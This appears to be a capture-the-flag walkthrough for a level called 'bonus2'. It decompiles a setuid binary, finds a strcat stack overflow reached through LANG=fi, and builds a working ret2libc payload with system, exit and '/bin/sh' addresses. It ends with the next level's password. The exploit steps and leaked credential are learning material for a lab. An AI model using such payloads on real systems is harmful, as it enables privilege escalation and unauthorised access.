# bonus2

Disassembly of the binary we have:

```c
//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
//

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ------------------- Function Prototypes --------------------

int32_t greetuser(void);

// --------------------- Global Variables ---------------------

int32_t g1 = 0; // 0x8049988

// ------------------------ Functions -------------------------

// Address range: 0x8048484 - 0x8048529
int32_t greetuser(void) {
    // 0x8048484
    int32_t str2; // 0x8048484
    char * str; // bp-76, 0x8048484
    switch (g1) {
        case 1: {
            // 0x80484ba
            str = (char *)-0x3c8986b8;
            // 0x804850a
            strcat((char *)&str, (char *)&str2);
            return puts((char *)&str);
        }
        case 2: {
            // 0x80484e9
            str = (char *)0x64656f47;
            // 0x804850a
            strcat((char *)&str, (char *)&str2);
            return puts((char *)&str);
        }
    }
    if (g1 == 0) {
        // 0x804849d
        str = (char *)0x6c6c6548;
    }
    // 0x804850a
    strcat((char *)&str, (char *)&str2);
    return puts((char *)&str);
}

// Address range: 0x8048529 - 0x8048638
int main(int argc, char ** argv) {
    // 0x8048529
    if (argc != 3) {
        // 0x8048630
        return 1;
    }
    // 0x8048548
    int32_t str; // bp-96, 0x8048529
    __asm_rep_stosd_memset((char *)&str, 0, 19);
    int32_t v1 = (int32_t)argv; // 0x804855c
    char * v2 = (char *)&str; // bp-176, 0x8048574
    strncpy((char *)&str, (char *)*(int32_t *)(v1 + 4), 40);
    int32_t str2; // bp-56, 0x8048529
    strncpy((char *)&str2, (char *)*(int32_t *)(v1 + 8), 32);
    v2 = "LANG";
    char * env_val = getenv("LANG"); // 0x80485a6
    if (env_val == NULL) {
        // 0x8048618
        __asm_rep_movsd_memcpy((char *)&v2, (char *)&str, 19);
        // 0x8048630
        return greetuser();
    }
    // 0x80485bc
    v2 = env_val;
    if (memcmp((int32_t *)env_val, (int32_t *)"fi", 2) == 0) {
        // 0x80485df
        g1 = 1;
        // 0x8048618
        __asm_rep_movsd_memcpy((char *)&v2, (char *)&str, 19);
        // 0x8048630
        return greetuser();
    }
    // 0x80485eb
    v2 = env_val;
    if (memcmp((int32_t *)env_val, (int32_t *)"nl", 2) == 0) {
        // 0x804860e
        g1 = 2;
    }
    // 0x8048618
    __asm_rep_movsd_memcpy((char *)&v2, (char *)&str, 19);
    // 0x8048630
    return greetuser();
}

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: gcc (4.6.3)
// Detected functions: 2
```

Assembly dump of what the main function looks like.

```c
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x08048529 <+0>:		push   ebp
   0x0804852a <+1>:		mov    ebp,esp
   0x0804852c <+3>:		push   edi
   0x0804852d <+4>:		push   esi
   0x0804852e <+5>:		push   ebx
   0x0804852f <+6>:		and    esp,0xfffffff0
   0x08048532 <+9>:		sub    esp,0xa0
   0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3
   0x0804853c <+19>:	je     0x8048548 <main+31>
   0x0804853e <+21>:	mov    eax,0x1
   0x08048543 <+26>:	jmp    0x8048630 <main+263>
   0x08048548 <+31>:	lea    ebx,[esp+0x50]
   0x0804854c <+35>:	mov    eax,0x0
   0x08048551 <+40>:	mov    edx,0x13
   0x08048556 <+45>:	mov    edi,ebx
   0x08048558 <+47>:	mov    ecx,edx
   0x0804855a <+49>:	rep stos DWORD PTR es:[edi],eax
   0x0804855c <+51>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804855f <+54>:	add    eax,0x4
   0x08048562 <+57>:	mov    eax,DWORD PTR [eax]
   0x08048564 <+59>:	mov    DWORD PTR [esp+0x8],0x28
   0x0804856c <+67>:	mov    DWORD PTR [esp+0x4],eax
   0x08048570 <+71>:	lea    eax,[esp+0x50]
   0x08048574 <+75>:	mov    DWORD PTR [esp],eax
   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804857f <+86>:	add    eax,0x8
   0x08048582 <+89>:	mov    eax,DWORD PTR [eax]
   0x08048584 <+91>:	mov    DWORD PTR [esp+0x8],0x20
   0x0804858c <+99>:	mov    DWORD PTR [esp+0x4],eax
   0x08048590 <+103>:	lea    eax,[esp+0x50]
   0x08048594 <+107>:	add    eax,0x28
   0x08048597 <+110>:	mov    DWORD PTR [esp],eax
   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
   0x0804859f <+118>:	mov    DWORD PTR [esp],0x8048738
   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
   0x080485ab <+130>:	mov    DWORD PTR [esp+0x9c],eax
   0x080485b2 <+137>:	cmp    DWORD PTR [esp+0x9c],0x0
   0x080485ba <+145>:	je     0x8048618 <main+239>
   0x080485bc <+147>:	mov    DWORD PTR [esp+0x8],0x2
   0x080485c4 <+155>:	mov    DWORD PTR [esp+0x4],0x804873d
   0x080485cc <+163>:	mov    eax,DWORD PTR [esp+0x9c]
   0x080485d3 <+170>:	mov    DWORD PTR [esp],eax
   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
   0x080485db <+178>:	test   eax,eax
   0x080485dd <+180>:	jne    0x80485eb <main+194>
   0x080485df <+182>:	mov    DWORD PTR ds:0x8049988,0x1
   0x080485e9 <+192>:	jmp    0x8048618 <main+239>
   0x080485eb <+194>:	mov    DWORD PTR [esp+0x8],0x2
   0x080485f3 <+202>:	mov    DWORD PTR [esp+0x4],0x8048740
   0x080485fb <+210>:	mov    eax,DWORD PTR [esp+0x9c]
   0x08048602 <+217>:	mov    DWORD PTR [esp],eax
   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
   0x0804860a <+225>:	test   eax,eax
   0x0804860c <+227>:	jne    0x8048618 <main+239>
   0x0804860e <+229>:	mov    DWORD PTR ds:0x8049988,0x2
   0x08048618 <+239>:	mov    edx,esp
   0x0804861a <+241>:	lea    ebx,[esp+0x50]
   0x0804861e <+245>:	mov    eax,0x13
   0x08048623 <+250>:	mov    edi,edx
   0x08048625 <+252>:	mov    esi,ebx
   0x08048627 <+254>:	mov    ecx,eax
   0x08048629 <+256>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   0x0804862b <+258>:	call   0x8048484 <greetuser>
   0x08048630 <+263>:	lea    esp,[ebp-0xc]
   0x08048633 <+266>:	pop    ebx
   0x08048634 <+267>:	pop    esi
   0x08048635 <+268>:	pop    edi
   0x08048636 <+269>:	pop    ebp
   0x08048637 <+270>:	ret
End of assembler dump.

```

Notable:
We have two calls to strncpy that we could overflow.

2 calls to  memcmp with the env var LANG with ‘fi’ and ‘nl’

```c
    if (memcmp((int32_t *)env_val, (int32_t *)"fi", 2) == 0)

    and

    if (memcmp((int32_t *)env_val, (int32_t *)"nl", 2) == 0)
```

call to the greetuser function :

```c
gdb-peda$ pdisas greetuser
Dump of assembler code for function greetuser:
   0x08048484 <+0>:		push   ebp
   0x08048485 <+1>:		mov    ebp,esp
   0x08048487 <+3>:		sub    esp,0x58
   0x0804848a <+6>:		mov    eax,ds:0x8049988
   0x0804848f <+11>:	cmp    eax,0x1
   0x08048492 <+14>:	je     0x80484ba <greetuser+54>
   0x08048494 <+16>:	cmp    eax,0x2
   0x08048497 <+19>:	je     0x80484e9 <greetuser+101>
   0x08048499 <+21>:	test   eax,eax
   0x0804849b <+23>:	jne    0x804850a <greetuser+134>
   0x0804849d <+25>:	mov    edx,0x8048710
   0x080484a2 <+30>:	lea    eax,[ebp-0x48]
   0x080484a5 <+33>:	mov    ecx,DWORD PTR [edx]
   0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx
   0x080484a9 <+37>:	movzx  ecx,WORD PTR [edx+0x4]
   0x080484ad <+41>:	mov    WORD PTR [eax+0x4],cx
   0x080484b1 <+45>:	movzx  edx,BYTE PTR [edx+0x6]
   0x080484b5 <+49>:	mov    BYTE PTR [eax+0x6],dl
   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>
   0x080484ba <+54>:	mov    edx,0x8048717
   0x080484bf <+59>:	lea    eax,[ebp-0x48]
   0x080484c2 <+62>:	mov    ecx,DWORD PTR [edx]
   0x080484c4 <+64>:	mov    DWORD PTR [eax],ecx
   0x080484c6 <+66>:	mov    ecx,DWORD PTR [edx+0x4]
   0x080484c9 <+69>:	mov    DWORD PTR [eax+0x4],ecx
   0x080484cc <+72>:	mov    ecx,DWORD PTR [edx+0x8]
   0x080484cf <+75>:	mov    DWORD PTR [eax+0x8],ecx
   0x080484d2 <+78>:	mov    ecx,DWORD PTR [edx+0xc]
   0x080484d5 <+81>:	mov    DWORD PTR [eax+0xc],ecx
   0x080484d8 <+84>:	movzx  ecx,WORD PTR [edx+0x10]
   0x080484dc <+88>:	mov    WORD PTR [eax+0x10],cx
   0x080484e0 <+92>:	movzx  edx,BYTE PTR [edx+0x12]
   0x080484e4 <+96>:	mov    BYTE PTR [eax+0x12],dl
   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
   0x080484e9 <+101>:	mov    edx,0x804872a
   0x080484ee <+106>:	lea    eax,[ebp-0x48]
   0x080484f1 <+109>:	mov    ecx,DWORD PTR [edx]
   0x080484f3 <+111>:	mov    DWORD PTR [eax],ecx
   0x080484f5 <+113>:	mov    ecx,DWORD PTR [edx+0x4]
   0x080484f8 <+116>:	mov    DWORD PTR [eax+0x4],ecx
   0x080484fb <+119>:	mov    ecx,DWORD PTR [edx+0x8]
   0x080484fe <+122>:	mov    DWORD PTR [eax+0x8],ecx
   0x08048501 <+125>:	movzx  edx,WORD PTR [edx+0xc]
   0x08048505 <+129>:	mov    WORD PTR [eax+0xc],dx
   0x08048509 <+133>:	nop
   0x0804850a <+134>:	lea    eax,[ebp+0x8]
   0x0804850d <+137>:	mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+141>:	lea    eax,[ebp-0x48]
   0x08048514 <+144>:	mov    DWORD PTR [esp],eax
   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
   0x0804851c <+152>:	lea    eax,[ebp-0x48]
   0x0804851f <+155>:	mov    DWORD PTR [esp],eax
   0x08048522 <+158>:	call   0x8048390 <puts@plt>
   0x08048527 <+163>:	leave
   0x08048528 <+164>:	ret
End of assembler dump.
```

This function contains a `strcat`  that we could overflow

---

Let’s try to overflow the strcat with a pattern as usual.

Here we made a file containing the pattern at `/tmp/pattern` .

```c
(gdb) r $(cat /tmp/pattern) $(cat /tmp/pattern)
Starting program: /home/user/bonus2/bonus2 $(cat /tmp/pattern) $(cat /tmp/pattern)
Hello AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH

Program received signal SIGSEGV, Segmentation fault.
0x08004848 in ?? ()
```

Overflow with pattern, we get a segfault.

```c
(gdb) i r
eax            0x4f	79
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xbffff440	-1073744832
esp            0xbffff3f0	0xbffff3f0
ebp            0x48484747	0x48484747
esi            0xbffff48c	-1073744756
edi            0xbffff43c	-1073744836
eip            0x8004848	0x8004848
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

We can see that half of the pattern is contained in the `eip` register. ie. `0x8004848` → 4848 being `H`

After some testing, we know that we have to overflow the second argument.

```c
$ LANG=fi gdb bonus2

(gdb) r $(python -c 'print "B"*200') $(python -c 'print "A"*200')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "B"*200') $(python -c 'print "A"*200')
Hyvää päivää BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

(gdb) i r
eax            0x5b	91
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xbffff450	-1073744816
esp            0xbffff400	0xbffff400
ebp            0x41414141	0x41414141 ; here it is in ebp
esi            0xbffff49c	-1073744740
edi            0xbffff44c	-1073744820
eip            0x41414141	0x41414141
eflags         0x210286	[ PF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

```

Here we define the LANG env variable as ‘fi’ and give it a pattern. We can now see that we overwrote the eip register. We now have to get the offset.

```c
(gdb) r $(python -c 'print "B"*200') $(cat /tmp/pattern)
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "B"*200') $(cat /tmp/pattern)
Hyvää päivää BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH

Program received signal SIGSEGV, Segmentation fault.
0x46464545 in ?? ()
```

It segfaults at `0x46464545` so FFEE so we now know that the offset starts at the third E.

Since the offset starts at E, the offset value will be 16. But, since it starts at the 3rd one it’s going to be 18.

Now we just need the address of the call to the `system()` function and an instance of `“/bin/sh”` .

Let’s try to find the instance of ‘/bin/sh’ :

```c
(gdb) info proc map
process 9646
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0x8048000  0x8049000     0x1000        0x0 /home/user/bonus2/bonus2
	0x8049000  0x804a000     0x1000        0x0 /home/user/bonus2/bonus2
	0x804a000  0x806b000    0x21000        0x0 [heap]
	0xb7e2b000 0xb7e2c000     0x1000        0x0
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0
	0xb7fdb000 0xb7fdd000     0x2000        0x0
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]

(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh" // These addresses represent where the libc library (/lib/i386-linux-gnu/libc-2.15.so) is loaded in memory.
0xb7f8cc58
1 pattern found.

(gdb) x/s 0xb7f8cc58
0xb7f8cc58:	 "/bin/sh"
```

We found the address of the string at `0xb77f8cc58` . Good.

and for system :

```c
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xb7e6b060  __libc_system
0xb7e6b060  system -> this is the one we need
0xb7f49550  svcerr_systemerr
```

Yay it’s at `0xb7e6b060`

and for exit :

```c
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xb7e5ebe0  exit -> This is the one we need
0xb7e5ec10  on_exit
0xb7e5ee20  __cxa_atexit
0xb7e5efc0  quick_exit
0xb7e5eff0  __cxa_at_quick_exit
0xb7ee41d8  _exit
0xb7f28500  pthread_exit
0xb7f2dc10  __cyg_profile_func_exit
0xb7f4c750  svc_exit
0xb7f56c80  atexit
```

The one for exit is located at `0xb7e5ebe0`

So now the injection string :

So the offset being 18, we print 18 times a character. We give the eip register the address of system so it can call it. We give it exit’s address to ret so it can exit properly. And give it the address of where “/bin/sh” is called.

So the string would look something like that :

```c
("B" * 18) + system's address + exit's address + "/bin/sh"'s address

python -c 'print "B"*18+"\x60\xb0\xe6\xb7"+"\xe0\xeb\xe5\xb7"+"\x58\xcc\xf8\xb7"'
```

But we can’t forget to set the value of LANG to either fi or nl or else it won’t work…

```c
$> LANG=fi ./bonus2 $(python -c 'print "A"*200') $(python -c 'print "B"*18+"\x60\xb0\xe6\xb7"+"\xe0\xeb\xe5\xb7"+"\x58\xcc\xf8\xb7"')
```

We are now logged as bonus3 and can cat the .pass file.

`71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
